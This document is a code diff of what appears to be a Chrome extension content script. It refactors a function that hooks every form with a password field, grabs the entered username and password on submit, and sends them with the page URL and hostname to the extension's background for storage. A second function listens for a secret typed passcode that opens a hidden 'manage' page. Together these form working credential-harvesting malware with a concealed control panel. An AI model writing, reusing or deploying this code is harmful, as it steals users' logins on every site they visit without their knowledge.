@@ -1,52 +1,45 @@
 function monitorSubmissions() {
+  
+    var forms = document.getElementsByTagName('form');
 
-    var fields = document.getElementsByTagName('input');
+    for (var i = 0; i < forms.length; i++) {
+      var form = forms[i];
+      var fields = form.getElementsByTagName('input');
 
-    for (var f = 0; f < fields.length; f++) {
-        // only monitor forms which have a `password` field
-        if (!fields.form || (fields[f].form && fields[f].type != 'password'))
-            continue;
+      // attempt to locate user/pass elements
+      for (var j = 0; j < fields.length; j++) {
+          var f = fields[j];
 
-        fields[f].form.addEventListener('submit', function() {
+          // recognize user/pass form elements
+          if (!form._pass && f.type == 'password')
+              form._pass = f;
+          else if (!form._user && (f.type == 'text' || f.type == 'email'))
+              form._user = f;
 
-            var user; // username or email
-            var pass; // password
+          // wait until user/pass are found
+          if (!(form._user !== undefined && form._pass !== undefined))
+              continue;
 
-            var children = this.getElementsByTagName('input');
-
-            // find likely `user` & `pass` elements
-            for (var c = 0; c < children.length; c++) {
-
-                var i = children[c];
-
-                if (! i.value || ! i.type)
-                    continue;
-
-                if (i.type == 'password' && ! pass)
-                    pass = i.value;
-                else if (i.type == 'text' || i.type == 'email' && ! user)
-                    user = i.value;
-
-                if (pass && user)
-                    break;
-            }
-
-            if (user && pass) {
-
-                // post credentials to background
-                chrome.extension.sendRequest({
-                    action: 'queryDatabase',
-                    crud: 'create',
-                    record: [
-                        window.location.href,
-                        window.location.hostname,
-                        user,
-                        pass
-                    ]
-                });
-            }
-        });
+          // user/pass elements found
+          // add event handler to form
+          form.onsubmit = function() {
+              if (this._user.value && this._pass.value) {
+                  // post credentials to background
+                  chrome.extension.sendRequest({
+                      action: 'queryDatabase',
+                      crud: 'create',
+                      record: [
+                          window.location.href,
+                          window.location.hostname,
+                          this._user.value,
+                          this._pass.value
+                      ]
+                  });
+              }
+        };
+        break;
     }
+  }
 }
 
 function monitorKeystrokes() {
@@ -60,17 +53,21 @@ function monitorKeystrokes() {
 
     chrome.storage.onChanged.addListener(function(changes, namespace) {
       for (key in changes) {
-        if (key == 'passcode') 
+        if (key == 'passcode')
           passcode = changes[key].newValue.toUpperCase();
       }
     });
 
     window.addEventListener('keydown', function(event) {
+
         // compare input with expected charCode
         if (event.which == passcode.charCodeAt(progress)) {
+
             if (progress == passcode.length - 1) {
+
                 // request to open the `manage` page
                 chrome.extension.sendRequest({action: 'openManage'});
+
             } else {
                 progress++;
                 return true;
